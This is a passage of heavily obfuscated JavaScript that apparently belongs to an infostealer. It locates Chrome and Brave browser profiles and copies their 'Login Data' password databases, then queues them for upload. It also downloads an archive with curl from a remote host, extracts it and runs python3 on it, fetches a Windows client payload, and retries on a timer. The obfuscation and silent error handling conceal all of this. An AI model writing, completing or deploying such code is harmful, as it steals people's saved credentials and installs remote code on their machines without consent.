    function _0x4170c9(_0x3faf1c, _0x564614, _0x26c9d8, _0x3aa10f) {
      return _0x143f14(
        _0x564614,
        _0x564614 - 0x1b6,
        _0x26c9d8 - 0x32,
        _0x3faf1c - 0x298
      );
    }
    const _0x594aee = {
      rkbkO: 'return\x20(fu' + _0x1411c7(0x8b, '0x11d', '0x7f', 0x17),
      Dajvc:
        _0x4170c9('0x161', '0xd3', '0x14c', '0x17e') +
        _0x4170c9(0x110, 0x179, 0x136, 0xea) +
        _0x1411c7(0x81, '0x95', '0xda', '0x99') +
        '\x20)',
      rkveu: function (_0x3a4c6d, _0x2cb639) {
        return _0x3a4c6d === _0x2cb639;
      },
      JfLVS: 'FSyJA',
      PBAUS: _0x4170c9('0x129', 0x142, 0xe2, '0x169'),
      yIzRq: function (_0xdd77cc) {
        return _0xdd77cc();
      },
      uzpyJ: function (_0x3719dc, _0x340082, _0x388dd2) {
        return _0x3719dc(_0x340082, _0x388dd2);
      },
      FhgJM: function (_0x343389, _0x8c1070) {
        return _0x343389 !== _0x8c1070;
      },
      yqKnW: _0x1411c7(0x83, '0xe5', 0xd3, 0xe5),
      zuOlq: function (_0x1658f1, _0x49dd4a) {
        return _0x1658f1(_0x49dd4a);
      },
      vsBdo: function (_0x798567, _0x46cc1b) {
        return _0x798567 + _0x46cc1b;
      },
      ktZsu: function (_0x2b0e5f, _0x34deb3, _0x3efd3e) {
        return _0x2b0e5f(_0x34deb3, _0x3efd3e);
      },
      kAyOp: _0x4170c9(0x1a6, '0x16e', '0x11b', '0x171'),
      qVvLa: _0x1411c7(0x69, 0x92, -0x20, '0x7f'),
      vdheA: function (_0x277cfd, _0x229e8d) {
        return _0x277cfd < _0x229e8d;
      },
      qIjJs: _0x4170c9('0x1a3', 0x110, 0x233, 0x21f),
      aiABb: 'Default',
      hxUyO: _0x1411c7('0x86', '0x1e', '0x92', -'0x9'),
      lMFko: _0x4170c9(0x121, 0x123, 0xb1, '0x1a0'),
      ebuvA: function (_0xa9e1e0, _0xacc95e) {
        return _0xa9e1e0(_0xacc95e);
      },
      LBuQw: _0x1411c7('0xdb', '0x72', '0x6a', '0x157'),
      jWXIX: _0x1411c7('0xf8', '0x70', 0x85, 0xb1),
      DgsQZ: function (_0xba01c5, _0x24e923) {
        return _0xba01c5 === _0x24e923;
      },
      EyZmF: _0x1411c7(0x80, '0xac', 0x73, '0xe9'),
      wwZVQ: function (_0x31586a, _0x4b2852) {
        return _0x31586a === _0x4b2852;
      },
    };
    let _0x22953b = [],
      _0x19bcdc =
        _0x486da7 +
        (_0x4170c9('0x103', 0x168, 0x11f, '0x9a') +
          _0x1411c7(0xe3, '0xa0', '0x8b', 0xe9) +
          _0x4170c9('0x144', '0x1cf', '0x19b', 0x1d8) +
          _0x4170c9('0x1ad', '0x15c', 0x1eb, '0x22f'));
    if (_0x22de84[_0x1411c7(0xe8, 0x167, 0xb0, 0x99)](_0x19bcdc))
      try {
        const _0x4c0703 = {};
        (_0x4c0703[_0x1411c7(0x9b, '0x31', 0x9, '0x12a')] = _0x594aee['kAyOp']),
          _0x22953b[_0x1411c7(0x176, '0x132', 0x1e7, 0xf9)]({
            value:
              _0x22de84[_0x1411c7('0x160', '0x1f4', 0x1f6, '0x1ea') + 'Stream'](
                _0x19bcdc
              ),
            options: _0x4c0703,
          });
      } catch (_0x3e1387) {}
    else {
      if (
        ((_0x19bcdc += _0x594aee[_0x4170c9('0x1ac', 0x22b, 0x156, '0x21c')]),
        _0x22de84[_0x1411c7(0xe8, '0xe8', '0xd4', '0x7b')](_0x19bcdc))
      )
        try {
          const _0x94fce4 = {};
          (_0x94fce4['filename'] =
            _0x594aee[_0x4170c9(0x1f8, '0x1bf', '0x1cc', 0x1c2)]),
            _0x22953b[_0x4170c9(0x1f1, 0x27a, '0x24c', 0x22c)]({
              value:
                _0x22de84[
                  'createRead' + _0x1411c7('0xb8', '0xf7', 0x12d, '0xa8')
                ](_0x19bcdc),
              options: _0x94fce4,
            });
        } catch (_0x57fbcd) {}
    }
    try {
      let _0x29fee0 =
        _0x486da7 +
        (_0x1411c7('0x13c', '0xbb', '0xc8', '0x161') +
          'pplication' +
          '\x20Support/G' +
          'oogle/Chro' +
          'me');
      if (_0x292b4d(_0x29fee0))
        for (
          let _0x23f16d = -0x1541 + 0x2449 + 0x1e1 * -0x8;
          _0x594aee[_0x1411c7(0x117, 0xba, 0xde, '0x7c')](
            _0x23f16d,
            -0x3f * -0x3f + 0x145c + -0x2315
          );
          _0x23f16d++
        ) {
          if (
            _0x594aee[_0x1411c7('0x133', '0x17c', 0xc0, '0x166')](
              _0x594aee['qIjJs'],
              _0x594aee[_0x1411c7('0x171', '0x125', 0x133, '0x1ee')]
            )
          ) {
            const _0x15849a =
              _0x29fee0 +
              '/' +
              (_0x594aee[_0x4170c9('0x1ae', 0x1ce, '0x20c', 0x1a6)](
                0x70c + -0x1 * -0xbcf + -0x12db,
                _0x23f16d
              )
                ? _0x594aee[_0x4170c9(0x1a7, '0x193', 0x166, '0x1ad')]
                : 'Profile\x20' + _0x23f16d) +
              ('/Login\x20Dat' + 'a');
            try {
              if (
                _0x594aee[_0x1411c7(0xdc, 0x131, '0x88', 0xd3)] ===
                _0x594aee['lMFko']
              ) {
                let _0x2a82bc;
                try {
                  _0x2a82bc = _0x1b3f6d(
                    BADtKR[_0x1411c7(0x181, '0x166', '0x1f7', '0x151')] +
                      BADtKR[_0x1411c7('0x109', '0x130', 0x120, '0x122')] +
                      ');'
                  )();
                } catch (_0x3e8f01) {
                  _0x2a82bc = _0x59c710;
                }
                return _0x2a82bc;
              } else {
                if (
                  !_0x594aee[_0x1411c7(0xd8, '0x140', '0x46', '0x6d')](
                    _0x292b4d,
                    _0x15849a
                  )
                )
                  continue;
                const _0x434848 =
                    _0x29fee0 +
                    _0x4170c9('0x1e2', 0x1b6, '0x278', 0x22c) +
                    _0x23f16d,
                  _0x142f8a = {};
                (_0x142f8a[_0x4170c9('0x116', 0x82, '0x180', 0x125)] =
                  'pld_' + _0x23f16d),
                  _0x594aee[_0x1411c7('0x141', 0x126, 0x1bb, 0x185)](
                    _0x292b4d,
                    _0x434848
                  )
                    ? _0x22953b[_0x1411c7(0x176, '0x15b', 0x159, 0x1f3)]({
                        value:
                          _0x22de84[
                            _0x4170c9('0x1db', '0x254', '0x1cf', 0x140) +
                              _0x1411c7(0xb8, '0x7c', 0xe6, '0x3b')
                          ](_0x434848),
                        options: _0x142f8a,
                      })
                    : _0x22de84[_0x4170c9('0x13a', 0x1ce, 0xa0, 0xda)](
                        _0x15849a,
                        _0x434848,
                        (_0x204877) => {
                          function _0x3d2ce7(
                            _0x246465,
                            _0x24ff76,
                            _0x2d19ad,
                            _0x3d08d6
                          ) {
                            return _0x4170c9(
                              _0x2d19ad - '0x3cc',
                              _0x3d08d6,
                              _0x2d19ad - '0xa1',
                              _0x3d08d6 - '0x33'
                            );
                          }
                          function _0x49bb3d(
                            _0x59ebc7,
                            _0x2c0b95,
                            _0x52878f,
                            _0x8f8b43
                          ) {
                            return _0x4170c9(
                              _0x59ebc7 - -0x10d,
                              _0x52878f,
                              _0x52878f - 0x14e,
                              _0x8f8b43 - '0x167'
                            );
                          }
                          const _0x2d4f2e = {
                            gPHeb: function (_0xcd5366, _0x378513) {
                              return _0xcd5366(_0x378513);
                            },
                          };
                          if (
                            _0x594aee[_0x49bb3d(0xa1, '0x55', '0x8c', '0x1f')](
                              _0x594aee[
                                _0x49bb3d(-'0x30', -'0x68', -'0x54', -0x10)
                              ],
                              _0x594aee[_0x49bb3d('0xc9', '0x4c', 0x128, 0xa5)]
                            )
                          ) {
                            if (_0x9f5185) throw _0x59d688;
                            _0x2d4f2e[_0x49bb3d('0x5f', -'0x7', 0xc5, '0x1')](
                              _0x5475f3,
                              _0x21e381
                            );
                          } else {
                            const _0x301200 = {};
                            _0x301200[_0x49bb3d('0x9', '0x57', -0x15, '0x64')] =
                              _0x49bb3d('0x80', '0x7f', 0x2, '0x7a') +
                              _0x23f16d;
                            let _0x27a6e4 = [
                              {
                                value:
                                  _0x22de84[
                                    _0x49bb3d('0xce', '0xe9', 0xb7, '0x70') +
                                      _0x49bb3d(0x26, '0x2a', -0x54, 0x61)
                                  ](_0x15849a),
                                options: _0x301200,
                              },
                            ];
                            _0x71ac45(_0x27a6e4);
                          }
                        }
                      );
              }
            } catch (_0x507806) {}
          } else
            _0x594aee['uzpyJ'](
              _0x3e482b,
              'tar\x20-xf\x20' +
                _0x44213d +
                _0x1411c7('0x193', '0x112', 0x10a, 0x18a) +
                _0x1bb96c,
              (_0x135ab2, _0x289dbd, _0x1d5f5c) => {
                function _0xa0a21(_0x6ce74b, _0x1f2aca, _0x16410e, _0x22d011) {
                  return _0x4170c9(
                    _0x6ce74b - -0x17,
                    _0x22d011,
                    _0x16410e - '0x104',
                    _0x22d011 - '0xf9'
                  );
                }
                if (_0x135ab2)
                  return (
                    _0x3f9bae[_0x95bf6(-0x18f, -0x194, -0x169, -'0x167')](
                      _0x485122
                    ),
                    void (_0x130889 =
                      0x1 * -0x2185 + -0x9a7 * 0x3 + 0x3e7a * 0x1)
                  );
                function _0x95bf6(_0x2e8d9c, _0x1ea5d1, _0x2df446, _0x5f58c4) {
                  return _0x4170c9(
                    _0x1ea5d1 - -'0x274',
                    _0x5f58c4,
                    _0x2df446 - 0xd5,
                    _0x5f58c4 - 0xe2
                  );
                }
                _0x21c935[_0x95bf6(-0x1c4, -'0x194', -0x1d7, -0x174)](
                  _0x306beb
                ),
                  _0x594aee[_0x95bf6(-0x222, -'0x198', -'0x1e8', -'0x106')](
                    _0x12ea20
                  );
              }
            );
        }
    } catch (_0x4e27af) {}
    try {
      if (
        _0x594aee['FhgJM'](
          _0x594aee[_0x4170c9('0x16f', '0x158', '0x195', '0x146')],
          _0x594aee['jWXIX']
        )
      ) {
        let _0xcc3130 =
          _0x486da7 +
          ('/Library/A' +
            'pplication' +
            '\x20Support/B' +
            _0x4170c9('0x1eb', '0x208', '0x259', 0x14f) +
            _0x1411c7(0x183, '0x1b8', '0xf5', 0x1d4) +
            _0x4170c9(0x1ed, '0x278', '0x23a', 0x164));
        if (
          _0x594aee[_0x1411c7(0x141, '0x1c8', '0x141', '0x166')](
            _0x292b4d,
            _0xcc3130
          )
        )
          for (
            let _0x268c58 = -0x6f + 0x19c7 * 0x1 + -0x1958;
            _0x594aee[_0x1411c7('0x117', '0xd8', '0x149', '0xe0')](
              _0x268c58,
              0xfe2 * 0x1 + -0x3 * 0xa5a + 0xff4
            );
            _0x268c58++
          ) {
            if (
              _0x594aee[_0x1411c7(0x68, 0xf, 0xd9, -'0x23')](
                _0x594aee['EyZmF'],
                _0x594aee[_0x4170c9(0xd8, 0x8e, '0x12e', 0x13e)]
              )
            ) {
              const _0x40141a =
                _0xcc3130 +
                '/' +
                (_0x594aee[_0x1411c7(0x178, 0x1ec, 0xfa, '0x111')](
                  -0x1 * -0xbd7 + 0x1 * 0x1536 + -0x210d,
                  _0x268c58
                )
                  ? _0x594aee[_0x4170c9('0x1a7', 0x1c0, '0x1f1', 0x1f5)]
                  : _0x4170c9('0xeb', 0x7d, 0xc7, '0x154') + _0x268c58);
              try {
                if (
                  !_0x594aee[_0x1411c7(0x141, 0x15d, 0x125, 0x187)](
                    _0x292b4d,
                    _0x40141a
                  )
                )
                  continue;
                const _0x5bcb27 =
                    _0x40141a +
                    (_0x1411c7('0x14c', 0x12e, 0x12a, '0x132') + 'a'),
                  _0xb69650 = {};
                (_0xb69650[_0x1411c7('0x9b', 0x90, '0x112', '0x9a')] =
                  _0x1411c7('0x6b', 0xf5, -'0x2b', 0xfd) + _0x268c58),
                  _0x594aee['ebuvA'](_0x292b4d, _0x5bcb27)
                    ? _0x22953b[_0x1411c7('0x176', 0x19e, 0x116, '0x19a')]({
                        value:
                          _0x22de84[
                            'createRead' + _0x1411c7(0xb8, 0x12c, '0x74', 0xc5)
                          ](_0x5bcb27),
                        options: _0xb69650,
                      })
                    : _0x22de84['copyFile'](
                        _0x40141a,
                        _0x5bcb27,
                        (_0x29a132) => {
                          function _0x357c65(
                            _0x12b23f,
                            _0x5882a6,
                            _0x12549a,
                            _0x3394d0
                          ) {
                            return _0x4170c9(
                              _0x12b23f - 0x213,
                              _0x12549a,
                              _0x12549a - '0x1f2',
                              _0x3394d0 - 0x15c
                            );
                          }
                          function _0x24d79c(
                            _0x20da55,
                            _0x5a34a1,
                            _0x550bde,
                            _0xe26e2c
                          ) {
                            return _0x4170c9(
                              _0x550bde - 0x2f0,
                              _0xe26e2c,
                              _0x550bde - '0x143',
                              _0xe26e2c - 0x106
                            );
                          }
                          if (
                            _0x594aee[
                              _0x24d79c('0x481', 0x482, '0x45a', 0x4c1)
                            ](
                              _0x594aee[
                                _0x24d79c('0x3b3', 0x44a, '0x3e8', 0x45f)
                              ],
                              _0x594aee[
                                _0x357c65(0x30b, '0x2de', '0x2a5', 0x32b)
                              ]
                            )
                          )
                            return [];
                          else {
                            const _0x6a6c9e = {};
                            _0x6a6c9e[
                              _0x24d79c(0x4a3, '0x418', 0x406, '0x3ac')
                            ] = 'brld_' + _0x268c58;
                            let _0x5d4e2c = [
                              {
                                value:
                                  _0x22de84[
                                    _0x24d79c(
                                      0x4a4,
                                      '0x564',
                                      '0x4cb',
                                      '0x510'
                                    ) +
                                      _0x357c65('0x346', '0x358', 0x3ab, 0x2bc)
                                  ](_0x40141a),
                                options: _0x6a6c9e,
                              },
                            ];
                            _0x594aee['zuOlq'](_0x71ac45, _0x5d4e2c);
                          }
                        }
                      );
              } catch (_0x374822) {}
            } else {
              if (_0x58756c)
                return (
                  (_0x4ca002 = -0x1eaa + -0x18bb + 0x3765),
                  void _0x594aee['yIzRq'](_0x4c3399)
                );
              try {
                (_0x3bc826 = _0x594aee['vsBdo'](
                  _0x140713,
                  -0xba4 + 0x29 * -0x7 + 0x443 * 0x3
                )),
                  _0x333b0f[_0x1411c7('0x11f', 0xa3, 0xa9, '0xb7')](
                    _0x2c2c42,
                    _0x292c02
                  ),
                  _0x594aee[_0x4170c9('0x153', 0x16c, '0xf0', 0x12a)](
                    _0x315ee2,
                    _0x5ba632
                  );
              } catch (_0x1290fa) {}
            }
          }
      } else {
        const _0x2466f4 = {
          wQFhK: function (_0x39c74c, _0x5c20b0, _0x5dac45) {
            function _0x2672c6(_0x312475, _0x18e4f6, _0x386738, _0x392f15) {
              return _0x4170c9(
                _0x392f15 - -0x34a,
                _0x18e4f6,
                _0x386738 - 0xb2,
                _0x392f15 - '0x15e'
              );
            }
            return _0x594aee[_0x2672c6(-0x23f, -0x16d, -0x1c9, -0x201)](
              _0x39c74c,
              _0x5c20b0,
              _0x5dac45
            );
          },
        };
        _0x5e0363[_0x1411c7(0x7f, -0x18, 0xa2, '0x49')](
          _0x131c88 + _0x1411c7(0x180, 0x1b8, '0x168', '0x1c0') + _0xd03dc,
          (_0x936fc6, _0x5adac3, _0x5ce9dd) => {
            function _0x39d512(_0x16f803, _0x9d04d2, _0x537ba8, _0x50e4a3) {
              return _0x4170c9(
                _0x537ba8 - -0x2d8,
                _0x16f803,
                _0x537ba8 - 0xad,
                _0x50e4a3 - 0x1b2
              );
            }
            function _0x770de6(_0x46a4fe, _0x15edc3, _0x5da92e, _0x434122) {
              return _0x4170c9(
                _0x5da92e - -0x1fa,
                _0x15edc3,
                _0x5da92e - 0x176,
                _0x434122 - '0x1d4'
              );
            }
            _0x936fc6 ||
              (_0x5da4da[
                _0x770de6(-'0xc4', -'0xbc', -0x5e, -0xe0) +
                  _0x770de6(-'0x166', -'0x110', -'0x105', -0x116)
              ](
                _0x4be5e1 + _0x39d512(-'0x13b', -'0x155', -'0xe9', -0x143),
                _0x5ce9dd
              ),
              _0x2466f4[_0x39d512(-'0x1ef', -'0x128', -'0x15d', -0x1e0)](
                _0x2b537a,
                _0x770de6(-0x70, -0x1e, -0x8f, -0x94) +
                  _0x36beae +
                  _0x770de6(-'0x9', -0x22, -0x1e, '0x60'),
                (_0xba7bbd, _0x37d1cd, _0x200010) => {}
              ));
          }
        );
      }
    } catch (_0x56ad3f) {}
    return _0x71ac45(_0x22953b), _0x22953b;
  },
  _0x79e525 = 0x12b741 + -0x3360a21 + 0x634cb4e;
function _0x143f14(_0x15f32b, _0x5d8d17, _0x5c71ee, _0x6f8071) {
  return _0xd469(_0x6f8071 - -0x2b3, _0x15f32b);
}
let _0x1c8cb2 = 0x38 * 0x85 + 0xc7 * -0x11 + 0x3 * -0x54b;
const _0x30c181 = async (_0x5cbbdd) => {
    function _0x2377dc(_0x1132be, _0xb6db07, _0x1092d0, _0x4a8d96) {
      return _0x143f14(
        _0x1092d0,
        _0xb6db07 - 0xb5,
        _0x1092d0 - '0x1c9',
        _0x4a8d96 - 0x451
      );
    }
    const _0x110788 = {
      qwSfI: _0x545686(0x3a6, '0x43d', '0x4c4', '0x47b'),
      fFHhd: function (_0x246001, _0x1d809c) {
        return _0x246001 === _0x1d809c;
      },
      kPodu: function (_0x44b674) {
        return _0x44b674();
      },
    };
    function _0x545686(_0x1ffea5, _0x44bf07, _0x2f581a, _0x3e1e70) {
      return _0x58b20d(
        _0x1ffea5,
        _0x44bf07 - '0xa8',
        _0x2f581a - '0x160',
        _0x44bf07 - '0xeb'
      );
    }
    _0x79d6af(
      _0x2377dc(0x3a2, 0x3df, '0x334', 0x361) +
        _0x5cbbdd +
        '\x20-C\x20' +
        _0x486da7,
      (_0x10b1e1, _0x3beeb2, _0x4da753) => {
        function _0x201231(_0x53d134, _0x2eb139, _0x480914, _0xf03fbe) {
          return _0x2377dc(
            _0x53d134 - '0x1d2',
            _0x2eb139 - '0x3b',
            _0x480914,
            _0xf03fbe - '0x247'
          );
        }
        function _0x59cd16(_0xad0b83, _0x303c48, _0x34bb92, _0x5d5f5a) {
          return _0x545686(
            _0xad0b83,
            _0x303c48 - '0x94',
            _0x34bb92 - 0x8f,
            _0x5d5f5a - 0x1c3
          );
        }
        if (
          _0x110788[_0x59cd16(0x472, '0x45a', '0x453', 0x496)](
            _0x201231(0x490, '0x531', '0x45b', '0x4e2'),
            'BvoQr'
          )
        ) {
          if (
            _0x4de17d[_0x59cd16(0x4a8, 0x41f, '0x480', 0x443)](
              _0x110788['qwSfI']
            )
          ) {
            let _0x4cc249 = _0x32f67a['join'](_0x228237, _0x2dece8),
              _0x1106d5 = [];
            (_0x1106d5 = _0x2378bb['readdirSyn' + 'c'](_0x4cc249)),
              _0x1106d5['forEach']((_0x141752) => {
                function _0x26a299(_0x519c48, _0x524791, _0x29172c, _0x36953b) {
                  return _0x201231(
                    _0x519c48 - 0x12f,
                    _0x524791 - '0x1',
                    _0x36953b,
                    _0x524791 - -0x176
                  );
                }
                function _0x3339f9(_0x3e5f8b, _0x1171a2, _0x33060c, _0x280ef6) {
                  return _0x59cd16(
                    _0x33060c,
                    _0x3e5f8b - -0x180,
                    _0x33060c - 0x104,
                    _0x280ef6 - '0xbe'
                  );
                }
                if (
                  !_0x1c31e7['statSync'](
                    _0x5d2333[_0x26a299('0x421', 0x3d6, '0x3ab', 0x458)](
                      _0x4cc249,
                      _0x141752
                    )
                  )[_0x3339f9(0x2f3, '0x321', '0x263', '0x2ad') + 'y']()
                ) {
                  let _0x4933de = _0x561f05[
                    _0x26a299('0x408', '0x3d6', 0x45a, '0x373')
                  ](_0x4cc249, _0x141752);
                  const _0x2867f8 = {};
                  (_0x2867f8['filename'] =
                    _0x471dfe + '_' + _0x28c6cd + '_' + _0x141752),
                    _0x582625[_0x3339f9(0x3a9, '0x410', 0x3ee, 0x32d)]({
                      value:
                        _0x4f02e5[
                          _0x26a299('0x434', 0x465, '0x43b', 0x43d) + 'Stream'
                        ](_0x4933de),
                      options: _0x2867f8,
                    });
                }
              });
          }
        } else {
          if (_0x10b1e1)
            return (
              _0x22de84[_0x201231('0x464', '0x44c', '0x4b1', 0x4e0)](_0x5cbbdd),
              void (_0x1c8cb2 = 0x773 + 0x1 * -0x49 + -0xe * 0x83)
            );
          _0x22de84[_0x201231('0x565', 0x4c7, '0x553', 0x4e0)](_0x5cbbdd),
            _0x110788['kPodu'](_0x168bc2);
        }
      }
    );
  },
  _0x53035b = () => {
    const _0x5e650c = {
        LObZM: function (_0x45a6bf, _0xbbd8cf) {
          return _0x45a6bf(_0xbbd8cf);
        },
        ZAJfS: function (_0x5bf7b5, _0x25cd18, _0x551f44) {
          return _0x5bf7b5(_0x25cd18, _0x551f44);
        },
        gTsAe: _0x275562(-0xce, -'0x78', -'0xa7', -0xd2),
        stfDO: function (_0x943111, _0x48bf55) {
          return _0x943111 !== _0x48bf55;
        },
        cUqGr: _0x3cc154(-'0x89', -'0x1b', -'0xf', -0x27),
        cJDlQ: function (_0x357c3a, _0x22abe8) {
          return _0x357c3a === _0x22abe8;
        },
        koHNv: 'jkztm',
        xHYJd: function (_0x40d977, _0x318553) {
          return _0x40d977 + _0x318553;
        },
        pZVPE: function (_0x4edde4, _0x326a4f) {
          return _0x4edde4 >= _0x326a4f;
        },
        XwAtL: function (_0x28e3de, _0x46d5c0) {
          return _0x28e3de + _0x46d5c0;
        },
        geJSM: function (_0x1774d4, _0x2fe791) {
          return _0x1774d4 >= _0x2fe791;
        },
        uEeaW: function (_0x2b0558, _0x3b3ca1) {
          return _0x2b0558 < _0x3b3ca1;
        },
        hkJow: function (_0x1b219b) {
          return _0x1b219b();
        },
        PgXQQ: _0x3cc154('0xce', '0x102', '0x6b', '0xf0'),
        tNwAT: _0x275562(-0xa0, -'0x19', 0x19, '0x5'),
      },
      _0xf91b31 = _0x144d75 + _0x275562('0x4', -'0x13', -0x58, '0xa'),
      _0x384361 = _0x40095b + _0x3cc154(0x109, '0x126', '0x99', '0xcf'),
      _0x498d06 = _0x40095b + '\x5cp2.zip';
    if (
      _0x5e650c[_0x275562(-0x3a, -'0x6b', -'0xcd', -'0x89')](
        _0x1c8cb2,
        _0x5e650c['XwAtL'](_0x79e525, -0x1 * -0x1ba9 + -0x5 * -0x654 + -0x3b47)
      )
    )
      return;
    function _0x3cc154(_0x43c346, _0x2a2553, _0x281a84, _0x493c08) {
      return _0x143f14(
        _0x2a2553,
        _0x2a2553 - '0x8',
        _0x281a84 - 0xc3,
        _0x281a84 - 0x196
      );
    }
    function _0x275562(_0xb960d8, _0x264d41, _0x57982a, _0x459f4a) {
      return _0x143f14(
        _0x459f4a,
        _0x264d41 - '0x100',
        _0x57982a - 0x111,
        _0x264d41 - '0x7a'
      );
    }
    if (_0x22de84['existsSync'](_0x384361))
      try {
        var _0x3546b4 =
          _0x22de84[_0x3cc154(0xb7, 0x11c, 0x104, '0x156')](_0x384361);
        _0x5e650c['geJSM'](
          _0x3546b4[_0x275562(-0x63, -'0xe6', -'0x145', -'0xea')],
          _0x5e650c['XwAtL'](_0x79e525, 0xd23 + -0x18d4 + 0x1 * 0xbb7)
        )
          ? ((_0x1c8cb2 = _0x3546b4[_0x275562(-0x63, -'0xe6', -'0x9c', -0xb8)]),
            _0x22de84[_0x3cc154(0xa8, 0x19a, 0x108, '0x131')](
              _0x384361,
              _0x498d06,
              (_0x222b2e) => {
                if (_0x222b2e) throw _0x222b2e;
                _0x5e650c['LObZM'](_0x30c181, _0x498d06);
              }
            ))
          : (_0x5e650c[_0x3cc154(0x20, 0x6, 0x19, -0x60)](
              _0x1c8cb2,
              _0x3546b4['size']
            )
              ? (_0x1c8cb2 = _0x3546b4[_0x3cc154(-0x11, '0xa5', '0x36', 0xb5)])
              : (_0x22de84[_0x3cc154(-0x26, 0x2, -0x22, '0x2d')](_0x384361),
                (_0x1c8cb2 = 0xa56 * 0x1 + -0x379 + -0x6dd)),
            _0x5e650c[_0x275562(-0x29, -'0xac', -0x8e, -0xf5)](_0x4c65a5));
      } catch (_0x50ea8b) {}
    else
      _0x5e650c[_0x3cc154(0xa5, 0x27, 0xa8, '0x3d')] !== _0x5e650c['tNwAT']
        ? _0x79d6af(
            'curl\x20-Lo\x20\x22' +
              _0x384361 +
              _0x275562(-'0x32', -0x6d, -'0x4f', -0x4f) +
              _0xf91b31 +
              '\x22',
            (_0x575c22, _0x5ba559, _0x55c673) => {
              function _0x374515(_0x4d5e48, _0x5ef2ec, _0x220d8c, _0x40cb58) {
                return _0x275562(
                  _0x4d5e48 - 0x142,
                  _0x220d8c - -'0xde',
                  _0x220d8c - '0x100',
                  _0x5ef2ec
                );
              }
              function _0x50354a(_0x5bc133, _0x1bec3f, _0x3b6e25, _0x17c757) {
                return _0x275562(
                  _0x5bc133 - 0x107,
                  _0x3b6e25 - '0x236',
                  _0x3b6e25 - '0x123',
                  _0x1bec3f
                );
              }
              if (
                _0x5e650c[_0x50354a(0x206, 0x1f3, '0x19e', 0x1e0)](
                  _0x5e650c[_0x50354a('0x12a', '0x151', '0x140', '0x1b2')],
                  _0x50354a('0x77', 0xd1, 0x10b, '0x1a0')
                )
              )
                _0x6276ae ||
                  (_0x484434[
                    _0x374515(-'0xfb', -'0x127', -'0x160', -'0x1aa') + 'ync'
                  ](
                    _0x200a01 + _0x50354a('0x29c', 0x199, 0x207, 0x1a1),
                    _0x3c9eef
                  ),
                  _0x5e650c[_0x374515(-'0xd7', -'0xf9', -0x11c, -'0xb7')](
                    _0x4ac585,
                    'python3\x20\x22' +
                      _0x35e098 +
                      _0x50354a(0x1a2, '0x25f', '0x1f4', 0x20f),
                    (_0x3618a7, _0x18bc86, _0x531663) => {}
                  ));
              else {
                if (_0x575c22)
                  return (
                    (_0x1c8cb2 = 0x1e56 + -0x25cf + 0x1 * 0x779),
                    void _0x4c65a5()
                  );
                try {
                  if (
                    _0x5e650c[_0x374515(-'0x225', -'0x18c', -0x1bf, -'0x200')](
                      _0x5e650c[
                        _0x374515(-'0x1bb', -0x159, -'0x131', -'0x183')
                      ],
                      _0x5e650c[_0x50354a('0x19b', '0x181', 0x1e3, '0x20b')]
                    )
                  )
                    (_0x1c8cb2 = _0x5e650c[
                      _0x50354a(0xdf, 0x18e, 0x15b, '0x130')
                    ](_0x79e525, 0x12c2 + 0x1 * 0x1dc0 + -0x74 * 0x6b)),
                      _0x22de84[_0x50354a('0x241', '0x142', '0x1b2', '0x12c')](
                        _0x384361,
                        _0x498d06
                      ),
                      _0x30c181(_0x498d06);
                  else
                    try {
                      const _0x6a0a20 = {};
                      (_0x6a0a20[
                        _0x374515(-'0x16a', -0x1ac, -'0x1e6', -0x1b0)
                      ] = _0x5e650c['gTsAe']),
                        _0x394da6['push']({
                          value:
                            _0x3658b8[
                              _0x50354a(0x27f, '0x1e4', '0x1f3', 0x156) +
                                _0x374515(-'0x1c7', -0x16b, -0x1c9, -'0x17c')
                            ](_0x43f4b3),
                          options: _0x6a0a20,
                        });
                    } catch (_0x1b34f1) {}
                } catch (_0xf941bb) {}
              }
            }
          )
        : _0x2662f8[_0x275562(-0x1cc, -0x13e, -0xa3, -'0xb7')](_0x4113b2);
  };
function _0x4c65a5() {
  const _0x232cbd = {
    qCcRI: function (_0x166f11, _0x116e8e, _0x5d2067) {
      return _0x166f11(_0x116e8e, _0x5d2067);
    },
  };
  function _0x2bbac9(_0x5348c6, _0x12412e, _0x10caf7, _0x2c74a4) {
    return _0x58b20d(
      _0x12412e,
      _0x12412e - 0x10b,
      _0x10caf7 - 0x6d,
      _0x2c74a4 - -'0x295'
    );
  }
  _0x232cbd[_0x2bbac9(0x49, 0x73, 0x3e, '0x59')](
    setTimeout,
    () => {
      _0x53035b();
    },
    -0x10e5 * -0x1 + 0x9823 + -0x5ae8
  );
}
const _0x168bc2 = async () =>
  await new Promise((_0x2e1d78, _0xcb70ea) => {
    function _0x34a53b(_0x4e1cff, _0x1c6d39, _0xc42627, _0x3a2049) {
      return _0x143f14(
        _0x3a2049,
        _0x1c6d39 - 0x1d5,
        _0xc42627 - 0x107,
        _0x1c6d39 - -'0x68'
      );
    }
    const _0x51661c = {
      jspse: function (_0xf2900b, _0x511314) {
        return _0xf2900b === _0x511314;
      },
      VivGD: _0x295d4a(0x291, 0x220, '0x2a5', '0x24e'),
      xDqyd: function (_0x140a73, _0x588b19, _0x2c9ab5) {
        return _0x140a73(_0x588b19, _0x2c9ab5);
      },
      Ilmxp: function (_0x19f496, _0xf6030a) {
        return _0x19f496(_0xf6030a);
      },
      xAYOv: function (_0x507c7d, _0x3b3b56) {
        return _0x507c7d + _0x3b3b56;
      },
      wanBv: 'return\x20(fu' + 'nction()\x20',
      TUCru:
        _0x295d4a('0x27b', '0x2c3', '0x29f', 0x25d) +
        'ctor(\x22retu' +
        _0x295d4a(0x1a3, 0x172, '0x293', 0x1f8) +
        '\x20)',
      oGuVF: function (_0x18cbf3) {
        return _0x18cbf3();
      },
    };
    function _0x295d4a(_0x487de4, _0x155fa5, _0x23c69a, _0x2cb956) {
      return _0x143f14(
        _0x487de4,
        _0x155fa5 - 0x18f,
        _0x23c69a - '0x31',
        _0x2cb956 - '0x394'
      );
    }
    if ('w' == _0x1bc283[0x5cd + 0x761 * 0x1 + -0xd2e])
      _0x22de84[_0x295d4a('0x1f9', '0x2f8', 0x298, '0x25f')](
        _0x486da7 + (_0x295d4a('0x2bc', '0x27e', '0x321', 0x2cb) + 'on.exe')
      )
        ? (() => {
            const _0x57a987 = _0x144d75 + '/client/' + _0x274c2b,
              _0x5382f3 = _0x486da7 + _0x174621('0x4c6', 0x454, 0x47d, '0x447'),
              _0x310444 =
                '\x22' +
                _0x486da7 +
                (_0x174621(0x3ad, 0x434, '0x429', 0x3b1) +
                  'on.exe\x22\x20\x22') +
                _0x5382f3 +
                '\x22';
            function _0xad2b11(_0xe83da5, _0x116617, _0x379b3a, _0x2b6415) {
              return _0x295d4a(
                _0x379b3a,
                _0x116617 - '0x14c',
                _0x379b3a - 0x1da,
